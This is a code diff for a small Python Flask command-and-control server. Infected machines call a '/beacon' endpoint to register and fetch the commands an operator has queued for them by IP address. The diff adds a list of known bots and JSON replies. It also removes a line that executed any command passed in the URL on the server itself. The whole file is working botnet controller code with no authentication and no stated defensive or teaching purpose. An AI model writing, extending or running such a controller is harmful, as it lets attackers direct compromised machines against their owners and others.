@@ -1,12 +1,12 @@
 #!/usr/bin/python3
 from flask import Flask, render_template, request
 from collections import defaultdict
-import os
+import os, json
 
 from collections import defaultdict
 
 bots = defaultdict(list)
-
+botLst = []
 app = Flask(__name__)
 
 	
@@ -14,9 +14,11 @@ app = Flask(__name__)
 def cmd():
 	botIP = request.args.get('botIP')
 	command = request.args.get('command')
-	output = os.popen(str(command)).read()
 	bots[botIP].append(command)
-	return render_template('form.html', command=command, output=output, botIP=botIP)
+	for bot in bots:
+		if bot not in botLst and bot != None:
+			botLst.append(bot)		
+	return render_template('form.html', command=command, botIP=botIP, bots=botLst)
 	
 	
 @app.route('/beacon')
@@ -25,7 +27,7 @@ def beacon():
 	if ip not in bots:
 		bots[ip] = []
 	else:
-		return str(bots[ip])
+		return json.dumps(bots[ip])
 		
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=80)
